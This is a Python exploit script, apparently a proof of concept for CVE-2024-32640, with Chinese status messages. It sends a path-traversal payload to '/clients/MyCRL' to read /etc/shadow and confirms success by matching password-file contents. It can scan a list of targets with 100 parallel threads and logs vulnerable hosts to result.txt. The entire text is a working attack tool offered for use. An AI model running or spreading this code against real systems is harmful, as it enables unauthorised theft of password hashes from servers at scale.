import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def poc(target):
    headers = {"Connection": "keep-alive"}
    data = "aCSHELL/../../../../../../../etc/shadow"
    url_payload = '/clients/MyCRL'
    url = target+url_payload
    res1 = requests.get(target,verify=False)
    if res1.status_code == 200:
        res2 = requests.post(url=url,headers=headers,data=data,verify=False)
        if 'root:' in res2.text and ':::' in res2.text:
            print(f'[+]{target}存在任意文件读取')
            with open('result.txt','a') as f:
                f.write(target+'\n')
        else:
            print(f'[-]{target}不存在任意文件读取')
    else:
        print(f'[-]{target}可能存在问题，请手工测试')
        
def main():

    parser = argparse.ArgumentParser(description="CVE-2024-32640_poc")
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()